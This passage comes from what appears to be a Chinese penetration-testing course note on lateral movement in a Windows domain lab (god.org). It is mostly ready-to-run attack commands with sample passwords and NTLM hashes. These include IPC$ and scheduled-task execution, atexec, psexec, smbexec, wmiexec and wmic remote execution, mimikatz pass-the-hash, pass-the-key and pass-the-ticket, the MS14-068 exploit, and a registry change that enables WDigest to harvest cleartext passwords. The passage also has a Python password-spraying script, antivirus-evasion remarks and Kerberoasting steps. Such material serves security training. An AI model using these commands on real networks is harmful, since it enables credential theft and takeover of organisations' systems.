扫当前机器所处C段的ssh端口，其它模块同理</span></span><br><span class="line">Ladon.exe 192.168.1.8/24 MysqlScan</span><br><span class="line"><span class="comment"># 扫当前机器所处C段的永恒之蓝漏洞，其它模块同理</span></span><br><span class="line">Ladon 192.168.1.8/24 MS17010</span><br></pre></td></tr></table></figure><h2 id="其他协议"><a class="markdownIt-Anchor" href="#其他协议"></a> 其他——协议</h2><h3 id="netbios探信息"><a class="markdownIt-Anchor" href="#netbios探信息"></a> NetBios——探信息</h3><p>NetBios是网络基本输入输出系统，通过这个协议，可以得到局域网内的主机信息，在windows下可以使用nbtstat查看netbios信息：<code>nbtstat -A &lt;ip&gt;</code>。</p><p>向内网发送这个协议的数据包，可以得到局域网内机器的计算机名、工作组、MAC地址。</p><h1 id="域横向传递"><a class="markdownIt-Anchor" href="#域横向传递"></a> 域横向【传递】</h1><p>拿下一台主机后，通过本地信息西欧及用户凭证，如何进行横向渗透拿下更多主机？</p><p>假设有：</p><ul><li><p>当前机器名称：<a href="http://webserver.god.org">webserver.god.org</a>，192.168.3.31</p></li><li><p>当前机器用户账户密码</p></li><li><p>本地管理员账号密码：<code>.\administrator:admin!@#45 </code></p></li><li><p>当前机器域用户密码：<code>god\webadmin:admin!@#45</code></p></li><li><p>域：<a href="http://god.org">god.org</a></p></li><li><p>域控ip——192.168.3.21</p><ul><li>Username : administrator</li><li>Domain   : <a href="http://god.org">god.org</a></li><li>Password : Admin12345</li></ul></li><li><p>域内其他用户ip</p><ul><li>192.168.3.25</li><li>192.168.3.29</li><li>192.168.3.30</li><li>192.168.3.32</li></ul></li></ul><h2 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h2><ol><li><p>得到webshell主机后，对主机的密码明文或者哈希进行抓取，具体参考：凭据信息搜集</p></li><li><p>对其他主机进行扫描，扩大攻击面：具体参考：探寻域控架构——存活主机探测</p></li><li><p>当获取到一些重要的明文密码/哈希值时，我们可以用这些值进行爆破/碰撞，发现使用相同密码的用户，然后进行哈希传递/明文密码等横向<strong>传递</strong>。有很多种方法，具体参考后面的章节。包括：</p><p>传递完成即找到碰撞的用户，那么可以在<strong>这些用户上再拿下凭证</strong>，添加到我们的库中，完成搜集，然后批量进行传递。</p></li><li><p>传递之后，整体上线CS，使用PTT进行权限维持（黄金票据和白银票据）</p></li><li><p>尝试建立ipc链接，如果成功，那么就可以保存，然后操作</p></li></ol><p>如果有能横向的机子，通常使用的有：<code>$ipc</code>链接，将文件上传到别的机子，然后再操作。</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629134037534.png" alt="image-20230629134037534" /></p><h2 id="域横向扫描atschtasks定时任务明文传递"><a class="markdownIt-Anchor" href="#域横向扫描atschtasks定时任务明文传递"></a> 域横向扫描——at&amp;schtasks定时任务&amp;明文传递</h2><p>之前说道AT和SCHTASKS是在提权的时候。是利用系统缺陷，当我们使用定时任务执行命令的时候，使用的是system权限。但是这个是通过ipc的。</p><h3 id="明文传递"><a class="markdownIt-Anchor" href="#明文传递"></a> 明文传递</h3><ol><li>建立 IPC 链接到目标主机：<code>net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator</code></li><li>拷贝要执行的命令脚本到目标主机：<code>copy add.bat \\192.168.3.21\c$</code></li><li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本：<code>at \\192.168.3.21 15:47 c:\add.bat</code></li><li>删除 IPC 链接</li></ol><p>当然里面的<code>at</code>指令可以替换成<code>atexec</code>，他是impacket上的工具，因为是第三方工具，易被查杀，需要做免杀。</p><p>操作：【它也可以进行哈希传递】</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe ./administrator:Admin12345@192.168.3.21 <span class="string">&quot;whoami&quot;</span></span><br><span class="line">atexec.exe god/administrator:Admin12345@192.168.3.21 <span class="string">&quot;whoami&quot;</span></span><br><span class="line">atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 <span class="string">&quot;whoami&quot;</span> <span class="comment"># 哈希传递</span></span><br></pre></td></tr></table></figure><h3 id="批量检测"><a class="markdownIt-Anchor" href="#批量检测"></a> 批量检测</h3><p>首先把前期搜集来的域内IP地址存在ips.txt中，然后把搜集来的明文密码存在pass.txt中，把哈希存在hash.txt中。然后将对应的语句弄成<code>bat</code>文件，在自己电脑运行即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %%i in (ips.txt) do net use \%%i\ipc$ &quot;admin!@#45&quot; /user:administrator </span><br><span class="line">#批量检测IP对应明文连接</span><br><span class="line">FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami</span><br><span class="line">#批量检测IP对应明文回显版</span><br><span class="line">FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami </span><br><span class="line">#批量检测明文对应IP回显版</span><br><span class="line">FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami </span><br><span class="line">#批量检测HASH对应IP回显版</span><br></pre></td></tr></table></figure><p>然而，这个可以用python写成更加好的代码进行攻击！小迪提供的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, time</span><br><span class="line"></span><br><span class="line">ips = &#123;</span><br><span class="line"><span class="comment">#...</span></span><br><span class="line">&#125;</span><br><span class="line">users = &#123;</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">&#125;</span><br><span class="line">passs = &#123;</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> mima <span class="keyword">in</span> passs:</span><br><span class="line">            <span class="built_in">exec</span> = <span class="string">&quot;net use \\\\&quot;</span> + ip + <span class="string">&#x27;\ipc$ &#x27;</span> + mima + <span class="string">&#x27; /user:god\\&#x27;</span> + user</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + <span class="built_in">exec</span> + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            os.system(<span class="built_in">exec</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>然后使用pyinstaller编译一下成为exe即可，无论是明文还是哈希传递，都是适用的：（也不保证一定行哦）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller</span><br><span class="line">pyinstaller -F fuck_neiwang_001.py <span class="comment">#生成可执行EXE</span></span><br></pre></td></tr></table></figure><p>我自己开发的脚本~暂时鸽了</p><h2 id="域横向扫描smbwmi哈希传递"><a class="markdownIt-Anchor" href="#域横向扫描smbwmi哈希传递"></a> 域横向扫描——smb&amp;wmi&amp;哈希传递</h2><p>Windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码 Windows2012以下版本若安装<strong>KB2871997</strong>补丁，同样也会导致无法获取明文密码</p><p>针对以上情况，我们提供了4种方式解决此类问题</p><ul><li><p>1.利用哈希hash传递(pth，ptk等)进行移动</p></li><li><p>2.利用其它服务协议(SMB,WMI等)进行哈希移动</p></li><li><p>3.利用注册表操作开启Wdigest Auth值进行获取</p><ul><li><p>注册表操作开启Wdigest Auth值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure></li></ul></li><li><p>4.利用工具或第三方平台(<a href="https://www.freebuf.com/sectool/164507.html">Hachcat</a>)进行破解获取</p><ul><li>在线hash解密</li><li>hash破解工具</li></ul></li></ul><h3 id="smb服务进行明文hash传递psexecsmbexec"><a class="markdownIt-Anchor" href="#smb服务进行明文hash传递psexecsmbexec"></a> SMB服务进行明文/Hash传递（psexec,smbexec）</h3><p>利用SMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放。</p><h4 id="psexec自带"><a class="markdownIt-Anchor" href="#psexec自带"></a> psexec（自带）：</h4><p>在微软官方Pstools工具包中，但是<strong>官方Pstools中的psexec只能明文连接</strong>，无法采用hash连接。如果需要hash连接，可以使用impacket工具包中的psexec，但是impacket非官方自带，容易被杀。</p><p>Pstools官方工具包：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools">https://docs.microsoft.com/en-us/sysinternals/downloads/pstools</a></p><p><strong>第一种方法：IPC连接</strong></p><p>先有ipc链接，psexec需要明文或hash传递</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.32\ipc$  <span class="string">&quot;admin!@#45&quot;</span> /user :administrator</span><br><span class="line">psexec \\192.168.3.32 -s cmd  <span class="comment"># 需要先有ipc链接 -s以System权限运行CMD</span></span><br></pre></td></tr></table></figure><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629104829648.png" alt="image-20230629104829648" style="zoom:67%;" /><p><strong>第二种方法：无需IPC连接</strong></p><p>不用建立IPC直接提供明文账户密码（推荐）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd</span><br><span class="line">psexec -hashes :$HASH$ ./administrator @10.1.2.3</span><br><span class="line">psexec -hashes :$HASH$ domain/administrator @10.1.2.3</span><br><span class="line">psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator @192.168.3.32</span><br></pre></td></tr></table></figure><p>利用hash失败，微软官方Pstools工具包中的psexec无法采用hash连接，只能明文连接。</p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629104943690.png" alt="image-20230629104943690" style="zoom:67%;" /><h4 id="smbexecimpacket"><a class="markdownIt-Anchor" href="#smbexecimpacket"></a> smbexec（impacket）</h4><p>非官方自带-参考impacket工具包使用，操作简单，容易被杀，无需先建立ipc链接、 明文或hash传递</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">smbexec god/administrator:Admin12345@192.168.3.21</span><br><span class="line">smbexec ./administrator:admin!@<span class="comment">#45@192.168.3.32</span></span><br><span class="line">smbexec -hashes :$HASH$ ./admin@192.168.3.21</span><br><span class="line">smbbexec -hashes :$HASH$ domain/admin@192.168.3.21</span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line">smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</span><br></pre></td></tr></table></figure><h3 id="wmi服务进行明文hash传递cscriptwmiexecwmic"><a class="markdownIt-Anchor" href="#wmi服务进行明文hash传递cscriptwmiexecwmic"></a> WMI服务进行明文/Hash传递（cscript,wmiexec,wmic）</h3><p><strong>WMI</strong> (Windows Management Instrumentation) 是通过135端口进行利用，支持用户名<strong>明文</strong>或者<strong>hash</strong>的方式进行认证，并且<strong>该方法不会在目标日志系统留下痕迹</strong>。它也有自带的和impacket版本的工具。</p><h4 id="wmic自带"><a class="markdownIt-Anchor" href="#wmic自带"></a> wmic（自带）</h4><ul><li>明文传递</li><li>优点是自带工具，不用考虑免杀</li><li>缺点是<strong>无回显</strong>, 需要想方法读取结果。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create <span class="string">&quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span></span><br><span class="line">wmic /node:192.168.3.32 /user:administrator /password:admin!@<span class="comment">#45 process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span></span><br></pre></td></tr></table></figure><p>那就输出到一个文件，然后进行读取完事。如果进行一些操作，回显并不重要，一系列操作不用回显其实也能做到。</p><h4 id="cscript自带"><a class="markdownIt-Anchor" href="#cscript自带"></a> cscript（自带）</h4><ul><li><a href="https://www.secpulse.com/wp-content/uploads/2015/05/cache-a360611dc24d240989799c29c555e4b7_wmiexec-v1_1.rar">下载链接</a></li><li>明文传递</li><li><strong>有回显</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345</span><br></pre></td></tr></table></figure><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629105840384.png" alt="image-20230629105840384" style="zoom:67%;" /><h4 id="wmiexecimpacket"><a class="markdownIt-Anchor" href="#wmiexecimpacket"></a> wmiexec（impacket）</h4><ul><li><strong>明文或hash传递</strong></li><li><strong>有回显</strong>exe版本</li><li>缺点：易被杀</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmiexec ./administrator:admin!@<span class="comment">#45@192.168.3.32 &quot;whoami&quot;</span></span><br><span class="line">wmiexec god/administrator:Admin12345@192.168.3.21 <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629110029964.png" alt="image-20230629110029964" /></p><h2 id="域横扫描pthptkptt哈希票据传递"><a class="markdownIt-Anchor" href="#域横扫描pthptkptt哈希票据传递"></a> 域横扫描——PTH&amp;PTK&amp;PTT（哈希票据传递）</h2><h3 id="pth"><a class="markdownIt-Anchor" href="#pth"></a> PTH</h3><p><strong>PTH</strong>(pass the hash) 利用 <strong>LM</strong> 或 <strong>NTLM</strong> 的值进行的渗透测试。</p><p>PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。</p><p><strong>禁用NTLM认证的影响</strong></p><p>如果禁用了 ntlm 认证，<strong>PsExec</strong> 无法利用获得的 ntlm hash 进行远程连接，但是使用 <strong>mimikatz</strong> 还是可以攻击成功。</p><p><strong>补丁 KB 2871997 的影响</strong></p><p>对于 8.1/2012r2，安装补丁 <strong>kb2871997</strong> 的 Win 7/2008r2/8/2012 等，可以使用 AES keys 代替 NT hash 来实现 ptk 攻击。</p><p>如果没有打补丁，那么所有用户都可以连接，打了就只能用administrator连接，或者使用 <strong>PTK</strong> 连接（AES 256），参考：<a href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a></p><p><strong>实践</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#域连接</span></span><br><span class="line">sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7</span><br><span class="line"><span class="comment">#工作组连接（就是改了个workgroup）</span></span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup/ntlm:518b98ad4178a53695dc997aa02d455c</span><br><span class="line"><span class="comment">#在实战中，本地用户与域用户，都尝试连接一下</span></span><br><span class="line">sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7</span><br><span class="line">\\OWA2010CN-God.god.org</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>当获取到域内一个主机的权限之后，可以使用mimikatz运行sekurlsa::logonPasswords命令获取其LM和NTLM。当收集到NTLM数据后，很有可能内网中有其他主机的NTLM值与我们收集到的一致。此时我们就可以使用NTLM进行内网横向渗透。运行以下命令，域横向移动PTH传递，攻击未打补丁下域内主机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7</span><br><span class="line">sekurlsa::pth/user:administrator /domain:workgroup/ntlm:518b98ad4178a53695dc997aa02d455c</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629131547015.png" alt="image-20230629131547015" /></p><p>弹出一个新的cmd框，只要弹出框，就说明这个域内主机与我们收集到的NTLM值相同。接下来我们就可以进行at schtasks 复制文件、执行文件等其他操作了。都是如同IPC的相关命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA2010CN-God.god.org\c$</span><br><span class="line">dir \\192.168.3.21\c$</span><br></pre></td></tr></table></figure><h3 id="ptk"><a class="markdownIt-Anchor" href="#ptk"></a> PTK</h3><p><strong>PTK</strong>(pass the key) 利用的 ekeys aes256 进行的渗透测试。使用mimikatz查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::ekeys <span class="comment">#获取aes256值</span></span><br><span class="line">sekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629131704319.png" alt="image-20230629131704319" /></p><h3 id="ptt提权"><a class="markdownIt-Anchor" href="#ptt提权"></a> PTT提权</h3><p><strong>PTT</strong>(pass the ticket) 利用票据凭证 TGT 进行的渗透测试。</p><p>PTT 攻击的部分就不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击的，这里就介绍三种常见的攻击方法：</p><ul><li>MS14-068</li><li>Golden ticket</li><li>SILVER ticket</li></ul><p>简单来说就是将连接合法的票据注入到内存中实现连接。 <strong>MS14-068 基于漏洞</strong>，Golden ticket(黄金票据)，SILVER ticket(白银票据)。<em>其中 Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术。暂时不讲。</em> MS14-068 造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780。</p><p>总结：ptt 传递<strong>不需本地管理员权限</strong>，连接时<strong>主机名连接</strong>，基于漏洞，工具，本地票据</p><h4 id="ms14-068"><a class="markdownIt-Anchor" href="#ms14-068"></a> <a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">MS14-068</a></h4><p>MS14-068 powershell 执行，能实现普通用户直接获取域控 system 权限</p><blockquote><p>MS14-068下载：<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p></blockquote><p>操作：</p><ol><li><p>查看SID，为后面的伪造提供数据验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; whoami /user</span><br><span class="line"> S-1-5-21-1218902331-2157346161-1782232778-1124</span><br></pre></td></tr></table></figure></li><li><p>清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">klist //查看当前机器凭证</span><br><span class="line">klist purge//清空当前机器中所有凭证</span><br></pre></td></tr></table></figure></li><li><p>利用 ms14-068 生成 TGT 数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码</span><br><span class="line">.\MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629132001607.png" alt="image-20230629132001607" /></p></li><li><p>票据注入内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./mimikatz.exe </span><br><span class="line">kerberos::ptc TGT_mary@god.org.ccache</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629132202287.png" alt="image-20230629132202287" /></p></li></ol><h4 id="kekeo"><a class="markdownIt-Anchor" href="#kekeo"></a> <a href="https://github.com/gentilkiwi/kekeo/releases">Kekeo</a>工具</h4><blockquote><p>工具kekeo下载：<a href="https://github.com/gentilkiwi/kekeo/releases">https://github.com/gentilkiwi/kekeo/releases</a></p></blockquote><p>操作：</p><ol><li><p>生成票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629132517844.png" alt="image-20230629132517844" /></p></li><li><p>导入票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi</span><br></pre></td></tr></table></figure></li><li><p>查看凭证 <code>klist </code>&amp; 利用，类似于ms14-068</p></li></ol><h4 id="利用本地票据"><a class="markdownIt-Anchor" href="#利用本地票据"></a> 利用本地票据</h4><p>因为当前主机肯定之前与其他主机连接过，所以本地应该生成了一些票据，我们可以导出这些票据，然后再导入票据，利用。该方法类似于cookie欺骗。</p><p>缺点：票据是有有效期的，一般为10小时，所以如果当前主机10h之内连接过域控的话，我们可以利用该票据，但是如果超过10h，就没法利用。</p><p>操作：</p><ol><li><p>导出本地票据(需管理权限)到当前目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629132753577.png" alt="image-20230629132753577" /></p></li><li><p>导入票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt xxxxxxxxxx.xxxx.kirbi</span><br></pre></td></tr></table></figure></li><li><p>利用票据</p></li></ol><h2 id="域横向扫描rdp传递mimikatz"><a class="markdownIt-Anchor" href="#域横向扫描rdp传递mimikatz"></a> 域横向扫描——RDP传递：mimikatz</h2><h3 id="rdp简介"><a class="markdownIt-Anchor" href="#rdp简介"></a> RDP简介</h3><p>除了之前讲到的使用IPC，WMI，SMB等协议进行连接外，获取到的铭文密码或HASH密文也可以通过RDP协议进行链接操作。</p><p>RDP是一个远程显示协议，为微软终端服务应用的程序。端口号为：3389。而与之对应的Linux上面叫ssh。</p><h4 id="明文密码连接"><a class="markdownIt-Anchor" href="#明文密码连接"></a> 明文密码连接：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># windows:</span></span><br><span class="line">mstsc /console  /v :192.168.3.21：3389  /admin</span><br><span class="line"><span class="comment"># linux: </span></span><br><span class="line">rdesktop 192.168.3.21:3389</span><br></pre></td></tr></table></figure><h4 id="密文连接"><a class="markdownIt-Anchor" href="#密文连接"></a> 密文连接</h4><ul><li>windows Server需要开启 <strong>Restricted Admin mode</strong>，</li><li>在Windows 8.1和Windows Server 2012 R2中默认开启</li><li>如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；</li></ul><p>可以通过修改注册表开启HASH连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD  <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t  REG_DWORD  /d  00000000  /f</span><br></pre></td></tr></table></figure><p>开启后运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mstsc.exe /restrictedadmin</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain :god  /ntlm </span><br><span class="line">:ccef208c6485269c20db2cad21734fe7  <span class="string">&quot;/run:mstsc.exe /restrictedadmin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="域横扫描kerberoast攻击和spn服务"><a class="markdownIt-Anchor" href="#域横扫描kerberoast攻击和spn服务"></a> 域横扫描——Kerberoast攻击和SPN服务</h2><p><a href="https://www.cnblogs.com/backlion/p/8082623.html">SPN扫描也称为”扫描Kerberos服务实例名称”</a>。<strong>SPN扫描通过请求特定SPN类型的服务主体名称来查找服务</strong>。与网络端口扫描相比，<strong>SPN扫描的主要特点是不需要通过连接网络中的每个IP地址来检查服务端口</strong>(不会因为触发内网中的IPS、IDS等设备的规则而产生大量的警告日志)。因为SPN查询是Kerberos票据行为的一 部分，所以检测难度很大。</p><ul><li><strong>在活动目录中发现服务的最佳方法就是SPN扫描</strong></li></ul><h3 id="kerberoast攻击"><a class="markdownIt-Anchor" href="#kerberoast攻击"></a> Kerberoast攻击</h3><p>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证（使用的是SPN）。</p><p>DC在活动目录中查找SPN，并使用与SPN关联的服务账户加密票证（TGS），以便服务能够验证用户是否可以访问。这个请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务账户的NTLM密码哈希用于加密服务票证。这样我们收到这个TGS票据，就可以离线破解。</p><p>利用方法：</p><p>由于<strong>域内的任何用户都可以向域内的任何服务请求TGS</strong>，知道相关服务的SPN后，可以用SPN申请一张票据 ST(TGS Ticket)，如果Kerberos 协议设置票据为 <code>RC4加密</code>，则可通过爆破的方式得到服务<strong>对应用户的密码</strong>。</p><p>有什么用：</p><p>我们获得该服务器的密码（TGS）后，我们就可以自己去请求某个服务。随意anytime</p><p>所以一般可以有以下流程：</p><ol><li>服务主体名称（SPN）发现</li><li>请求服务票据</li><li>导出服务票据</li><li>破解服务票据</li><li>重写服务票据&amp;RAM注入</li></ol><p>kerberoast下载：<a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><p>更加详细的流程（包括扩大攻击面）：<a href="https://www.cnblogs.com/zpchcbd/p/11707776.html">https://www.cnblogs.com/zpchcbd/p/11707776.html</a></p><h3 id="spn探针"><a class="markdownIt-Anchor" href="#spn探针"></a> SPN探针</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn <span class="literal">-q</span> */*</span><br><span class="line">setspn <span class="literal">-q</span> */* | findstr <span class="string">&quot;MSSQL&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230703095801762.png" alt="image-20230703095801762" /></p><h3 id="请求票据"><a class="markdownIt-Anchor" href="#请求票据"></a> 请求票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除缓存票据</span></span><br><span class="line">klist purge</span><br><span class="line"></span><br><span class="line"><span class="comment"># powershell请求</span></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel</span><br><span class="line"><span 